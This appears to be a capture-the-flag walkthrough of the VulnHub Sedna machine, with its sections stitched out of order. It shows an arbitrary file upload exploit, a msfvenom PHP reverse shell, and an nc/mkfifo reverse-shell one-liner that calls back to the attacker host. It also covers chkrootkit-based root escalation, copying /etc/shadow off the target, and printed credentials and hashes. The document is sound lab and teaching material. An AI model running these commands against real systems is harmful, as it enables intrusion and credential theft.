rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Chkrootkit 0.49 - Local Privilege Escalation                                                                 | exploits/linux/local/33899.txt</div></div><div><br/></div><div>The write-up in the Exploit Database states that chkrootkit has to be run by root to launch the exploit (typically through a cron job). Let's see if chkrootkit is set up to run in cron...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/etc$ grep -ri 'chkrootkit' cron*</div><div>www-data@Sedna:/etc$</div></div><div><br/></div><div>Nothing. 😞 It is possible a cronjob is set up in root's crontab, but we can't know for sure. Doesn't hurt to try it...</div><div><br/></div><div>Started my reverse shell listener in Metasploit.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5434</div><div>LPORT =&gt; 5434</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 7.</div><div>[*] Exploit completed, but no session was created.</div><div>[*] Started reverse TCP handler on 10.183.0.222:5434 </div></div><div><br/></div><div>Created 'update' file with the following.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# cat update</div><div>#!/bin/sh</div><div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5434 &gt;/tmp/f</div></div><div><br/></div><div>Transferred the update file to /tmp on the victim using python SimpleHTTPServer and wget.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/tmp$ wget -O update 10.183.0.222:4321/update</div><div>wget -O update 10.183.0.222:4321/update</div><div>--2019-04-15 19:48:34--  http://10.183.0.222:4321/update</div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 90 [application/octet-stream]</div><div>Saving to: 'update'</div><div><div><br/></div><div><br/></div></div><div>100%[======================================&gt;] 90          --.-K/s   in 0s      </div><div><div><br/></div><div><br/></div></div><div>2019-04-15 19:48:34 (23.8 MB/s) - 'update' saved [90/90]</div></div><div><br/></div><div>IMPORTANT: We need to set our 'update' file as executable to get it to run when chkrootkit does, obviously.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/tmp$ chmod +x update</div></div><div><br/></div><div>Now we wait... but not for long...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Sedna:/tmp$ [*] Command shell session 7 opened (10.183.0.222:5434 -&gt; 10.183.0.185:40341) at 2019-04-15 19:55:02 -0400</div><div><br/></div><div>www-data@Sedna:/tmp$ sessions 7</div><div><br/></div><div><div>[*] Backgrounding session 3...</div></div><div>[*] Starting interaction with 7...</div><div><div><br/></div><div># id</div></div><div>uid=0(root) gid=0(root) groups=0(root)</div></div><div><br/></div><div>Turns out root did have 'chkrootkit' set up to run in his crontab every 5 minutes. :] I guess if you are going to run a vulnerable piece of software, you should at least run it often.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div># crontab -l</div><div># Edit this file to introduce tasks to be run by cron.</div><div># </div><div># Each task to run has to be defined through a single line</div><div># indicating with different fields when the task will be run</div><div># and what command to run for the task</div><div># </div><div># To define the time you can provide concrete values for</div><div># minute (m), hour (h), day of month (dom), month (mon),</div><div># and day of week (dow) or use '*' in these fields (for 'any').# </div><div># Notice that tasks will be started based on the cron's system</div><div># daemon's notion of time and timezones.</div><div># </div><div># Output of the crontab jobs (including errors) is sent through</div><div># email to the user the crontab file belongs to (unless redirected).</div><div># </div><div># For example, you can run a backup of all your user accounts</div><div># at 5 a.m every week with:</div><div># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</div><div># </div><div># For more information see the manual pages of crontab(5) and cron(8)</div><div># </div><div># m h  dom mon dow   command</div><div>*/5 * * * * /root/chkrootkit/chkrootkit</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">crackmeforpoints</span></div><div><br/></div><div>Found an additional "flag" in the /etc/passwd file...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Sedna:~# cat /etc/passwd</div><div>[...]</div><div>crackmeforpoints:x:1000:1000::/home/crackmeforpoints:</div><div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div></div><div><br/></div><div>The hash for the account is...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Sedna:~# cat /etc/shadow</div><div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div><div>crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y/1upG.54kSph/HSP1LFcn4.2C11cF0R7QmojBqNy5/:17104:0:99999:7:::</div><div>[...]</div></div><div><br/></div><div>I copied the passwd and shadow files to my attacking machine using scp and ran unshadow. I also ran john with a big dictionary, but was not able to crack the password. ¯\_(ツ)_/¯</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/sedna# scp -i sedna root@10.183.0.185:/etc/passwd .</div><div>passwd                                                                                                              100% 1962   587.1KB/s   00:00</div><div>root@kali:~/Walkthroughs/hackfest2016/sedna# scp -i sedna root@10.183.0.185:/etc/shadow .</div><div>shadow                                                                                                              100% 1235   401.1KB/s   00:00</div><div>root@kali:~/Walkthroughs/hackfest2016/sedna# unshadow ./passwd ./shadow &gt; crackme</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">tomcat-users.xml</span></div><div><br/></div><div>Once we had root we were able to browse through protected configuration files in /etc including the tomcat-users.xml file in /etc/tomcat7. The credentials in this file could be used on the Tomcat service listening on TCP port 8080.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Sedna:/etc/tomcat7# cat tomcat-users.xml </div><div>&lt;?xml version='1.0' encoding='utf-8'?&gt;</div><div>&lt;!--</div><div>  Licensed to the Apache Software Foundation (ASF) under one or more</div><div>  contributor license agreements.  See the NOTICE file distributed with</div><div>  this work for additional information regarding copyright ownership.</div><div>  The ASF licenses this file to You under the Apache License, Version 2.0</div><div>  (the "License"); you may not use this file except in compliance with</div><div>  the License.  You may obtain a copy of the License at</div><div><div><br/></div><div><br/></div></div><div>      http://www.apache.org/licenses/LICENSE-2.0</div><div><div><br/></div><div><br/></div></div><div>  Unless required by applicable law or agreed to in writing, software</div><div>  distributed under the License is distributed on an "AS IS" BASIS,</div><div>  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</div><div>  See the License for the specific language governing permissions and</div><div>  limitations under the License.</div><div>--&gt;</div><div>&lt;tomcat-users&gt;</div><div>&lt;!--</div><div>  NOTE:  By default, no user is included in the "manager-gui" role required</div><div>  to operate the "/manager/html" web application.  If you wish to use this app,</div><div>  you must define such a user - the username and password are arbitrary.</div><div>--&gt;</div><div>&lt;!--</div><div>  NOTE:  The sample user and role entries below are wrapped in a comment</div><div>  and thus are ignored when reading this file. Do not forget to remove</div><div>  &lt;!.. ..&gt; that surrounds them.</div><div>--&gt;</div><div><div>&lt;!--</div><div>  &lt;role rolename="tomcat"/&gt;</div><div>  &lt;role rolename="role1"/&gt;</div><div>  &lt;user username="tomcat" password="tomcat" roles="tomcat"/&gt;</div><div>  &lt;user username="both" password="tomcat" roles="tomcat,role1"/&gt;</div><div>  &lt;user username="role1" password="tomcat" roles="role1"/&gt;</div><div>--&gt;</div><div>&lt;role rolename="manager-gui"/&gt;</div><div>&lt;user username="tomcat" password="submitthisforpoints" roles="manager-gui"/&gt;</div><div>&lt;/tomcat-users&gt;</div></div></div><div><br/></div><div><br/></div><div><br/></div></body></html>
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/hackfest2016-sedna,181/" target="_blank">https://www.vulnhub.com/entry/hackfest2016-sedna,181/</a></div>
+<div>Hostname: sedna</div>
+<div>IP Address: 10.183.0.185</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.185.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# nmap -Pn -sT -sV -A -p 1-65535 -oA sedna 10.183.0.185</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-15 13:55 EDT</div>
+    <div>Nmap scan report for Sedna.homenet.dom (10.183.0.185)</div>
+    <div>Host is up (0.0049s latency).</div>
+    <div>Not shown: 65523 closed ports</div>
+    <div>PORT      STATE SERVICE     VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>| ssh-hostkey:</div>
+    <div>|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)</div>
+    <div>|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)</div>
+    <div>|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)</div>
+    <div>|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</font>
+    </div>
+    <div>| dns-nsid:</div>
+    <div>|_  bind.version: 9.9.5-3-Ubuntu</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</font>
+    </div>
+    <div>| http-robots.txt: 1 disallowed entry</div>
+    <div>|_Hackers</div>
+    <div>|_http-server-header: Apache/2.4.7 (Ubuntu)  </div>
+    <div>|_http-title: Site doesn't have a title (text/html).</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">110/tcp   open  pop3        Dovecot pop3d</font>
+    </div>
+    <div>|_pop3-capabilities: SASL STLS UIDL PIPELINING CAPA RESP-CODES TOP AUTH-RESP-CODE</div>
+    <div>|_ssl-date: TLS randomness does not represent time</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp   open  rpcbind     2-4 (RPC #100000)</font>
+    </div>
+    <div>| rpcinfo:</div>
+    <div>|   program version   port/proto  service</div>
+    <div>|   100000  2,3,4        111/tcp  rpcbind</div>
+    <div>|   100000  2,3,4        111/udp  rpcbind</div>
+    <div>|   100024  1          44953/udp  status</div>
+    <div>|_  100024  1          60597/tcp  status</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">143/tcp   open  imap        Dovecot imapd (Ubuntu)</font>
+    </div>
+    <div>|_imap-capabilities: listed SASL-IR IDLE OK post-login ENABLE capabilities Pre-login have LITERAL+ ID more LOGINDISABLEDA0001 LOGIN-REFERRALS STARTTLS</div>
+    <div> IMAP4rev1</div>
+    <div>|_ssl-date: TLS randomness does not represent time</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">993/tcp   open  ssl/imaps?</font>
+    </div>
+    <div>|_ssl-date: TLS randomness does not represent time</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">995/tcp   open  ssl/pop3s?</font>
+    </div>
+    <div>
+        <div>|_ssl-date: TLS randomness does not represent time</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</font>
+        </div>
+        <div>| http-methods:</div>
+        <div>|_  Potentially risky methods: PUT DELETE</div>
+        <div>|_http-open-proxy: Proxy might be redirecting requests</div>
+        <div>|_http-server-header: Apache-Coyote/1.1</div>
+        <div>|_http-title: Apache Tomcat</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">60597/tcp open  status      1 (RPC #100024)  </font>
+        </div>
+        <div>MAC Address: 08:00:27:1D:C3:C2 (Oracle VirtualBox virtual NIC)</div>
+        <div>Device type: general purpose</div>
+        <div>Running: Linux 3.X|4.X</div>
+        <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+        <div>OS details: Linux 3.2 - 4.9</div>
+        <div>Network Distance: 1 hop</div>
+        <div>Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>
+            <div><br /></div>
+            <div><br /></div>
+        </div>
+        <div>Host script results:</div>
+        <div>|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s</div>
+        <div>|_nbstat: NetBIOS name: SEDNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div>
+        <div>| smb-os-discovery:</div>
+        <div>|   OS: Unix (Samba 4.1.6-Ubuntu)</div>
+        <div>|   Computer name: sedna</div>
+        <div>|   NetBIOS computer name: SEDNA\x00</div>
+        <div>|   Domain name: homenet.dom</div>
+        <div>|   FQDN: sedna.homenet.dom</div>
+        <div>|_  System time: 2019-04-15T13:55:59-04:00   </div>
+        <div>| smb-security-mode:</div>
+        <div>|   account_used: guest</div>
+        <div>|   authentication_level: user</div>
+        <div>|   challenge_response: supported</div>
+        <div>|_  message_signing: disabled (dangerous, but default)</div>
+        <div>| smb2-security-mode:</div>
+        <div>|   2.02:</div>
+        <div>
+            <div>|_    Message signing enabled but not required</div>
+            <div>| smb2-time:</div>
+            <div>|   date: 2019-04-15 13:55:59</div>
+            <div>|_  start_date: N/A</div>
+            <div>
+                <div><br /></div>
+                <div><br /></div>
+            </div>
+            <div>TRACEROUTE</div>
+            <div>HOP RTT     ADDRESS</div>
+            <div>1   4.94 ms Sedna.homenet.dom (10.183.0.185) </div>
+            <div>
+                <div><br /></div>
+                <div><br /></div>
+            </div>
+            <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+            <div>Nmap done: 1 IP address (1 host up) scanned in 163.94 seconds</div>
+        </div>
+    </div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Used nikto to scan the HTTP service on port 80.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# nikto -h http://10.183.0.185</div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Target IP:          10.183.0.185</div>
+    <div>+ Target Hostname:    10.183.0.185</div>
+    <div>+ Target Port:        80</div>
+    <div>+ Start Time:         2019-04-15 14:22:16 (GMT-4)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> (Ubuntu)</div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
+    <div>+ "robots.txt" contains 1 entry which should be manually viewed.</div>
+    <div>+ Server may leak inodes via ETags, header found with file /, inode: 65, size: 53fb059bb5bc8, mtime: gzip</div>
+    <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+    <div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </div>
+    <div>+ OSVDB-3268: /files/: Directory indexing found.</div>
+    <div>+ OSVDB-3092: /files/: This might be interesting...</div>
+    <div>+ OSVDB-3092: /system/: This might be interesting...</div>
+    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
+    <div>+ OSVDB-3092: /license.txt: License file found may identify site software.</div>
+    <div>+ 7917 requests: 0 error(s) and 12 item(s) reported on remote host</div>
+    <div>+ End Time:           2019-04-15 14:26:25 (GMT-4) (249 seconds)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>Browsed through the /files directory, but it only contains images (and some access denied).</div>
+<div><br /></div>
+<div>The license.txt file at <a href="http://10.183.0.185/license.txt">http://10.183.0.185/license.txt</a> looks like it is for BuilderEngine.</div>
+<div><br /></div>
+<div><img height="330" src="/assets/images/2019-04-15-hackfest2016-sedna/D6538F1F-BEAD-468E-A63C-5829F851BCC2.png" width="619" /><br /></div>
+<div><br /></div>
+<div>Searching the exploit database, there appears to be a known exploit that allows unauthenticated users to upload files.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>BuilderEngine 3.5.0 - Arbitrary File Upload                                                                  | exploits/php/webapps/40390.php</div>
+</div>
+<div><br /></div>
+<div>I checked the URL in the exploit to confirm the path was accessible on the server. It was, so I modified the exploit to post to the victim (and changed the extension to .html).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# diff 40390.php 40390.html </div>
+    <div>22c22</div>
+    <div>&lt; &lt;form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"&gt;</div>
+    <div>---</div>
+    <div>&gt; &lt;form method="post" action="http://10.183.0.185/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"&gt;</div>
+</div>
+<div><br /></div>
+<div>I used msfvenom to create my PHP reverse shell payload.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>No encoder or badchars specified, outputting raw payload</div>
+    <div>Payload size: 3053 bytes</div>
+</div>
+<div><br /></div>
+<div>I used the exploit form to upload the payload...</div>
+<div><br /></div>
+<div><img height="62" src="/assets/images/2019-04-15-hackfest2016-sedna/5FE4296A-0E24-4731-9035-6F6164D46C2E.png" width="592" /><br /></div>
+<div><br /></div>
+<div>...which returned a JSON object with the uploaded file's path.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>{</div>
+    <div>    "files": [</div>
+    <div>    {</div>
+    <div>        "name": "rev.php",</div>
+    <div>        "size": 3053,</div>
+    <div>        "type": "text\/php",</div>
+    <div>        "url": "http:\/\/10.183.0.185\/files\/rev.php",</div>
+    <div>        "deleteUrl": "http:\/\/10.183.0.185\/themes\/dashboard\/assets\/plugins\/jquery-file-upload\/server\/php\/?file=rev.php",</div>
+    <div>        "deleteType": "DELETE"</div>
+    <div>    }]</div>
+    <div>}</div>
+</div>
+<div><br /></div>
+<div>I started a handler in Metasploit to catch the PHP reverse shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+    <div>LPORT =&gt; 5432</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 0.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5432</div>
+</div>
+<div><br /></div>
+<div>Then I used curl to request the PHP reverse shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# curl http://10.183.0.185/files/rev.php</div>
+</div>
+<div><br /></div>
+<div>And our session was created...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.185:40883) at 2019-04-15 15:26:47 -0400</div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+    <div>[*] Starting interaction with 1...</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>pwd</div>
+    <div>/var/www/html/files</div>
+    <div>id</div>
+    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+</div>
+<div><br /></div>
+<div>I found the first flag in the /var/www directory.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>cd /var/www</div>
+    <div>cat flag.txt</div>
+    <div>bfbb7e6e6e88d9ae66848b9aeac6b289</div>
+</div>
+<div><br /></div>
+<div>Since the PHP shell only stays up for a limited time, I created another listener in Metasploit and started a reverse shell from the victim using Perl.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+    <div>LPORT =&gt; 5433</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 3.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
+</div>
+<div><br /></div>
